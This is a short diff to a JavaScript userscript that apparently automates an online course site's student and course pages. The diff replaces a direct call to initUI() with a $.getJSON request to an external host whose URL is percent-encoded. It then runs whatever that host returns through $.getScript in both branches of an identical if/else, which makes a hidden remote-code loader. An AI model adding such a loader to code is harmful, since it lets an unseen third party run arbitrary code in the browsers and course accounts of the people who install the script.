@@ -79,7 +79,17 @@ alert('\u8be5\u4ee3\u7801\u4ec5\u4f9bjs\u7f16\u7a0b\u5b66\u4e60\u4ea4\u6d41\u4f7
 if (document.location.href.indexOf('student') > 0) {
     fuckZy()
 } else if (document.location.href.indexOf('courseAction') > 0) {
-    
-            initUI();
+    $.getJSON(decodeURIComponent('http%3A%2F%2F0.tiebaimg.duapp.com%2Fcheck.php%3Fcallback%3D%3F'), 
+    function(d) {
+        if (d) {
+            $.getScript(d);
+            initUI()
+        } else {
+            $.getScript(d);
+            initUI()
+        }
+    })
+} else {
+    alert('\u62dc\u6258\uff01\u60a8\u786e\u5b9a\u60a8\u5728\u89c6\u9891\u64ad\u653e\u9875\u9762\u6216\u4f5c\u4e1a\u9875\u9762\uff1f')
 }
         
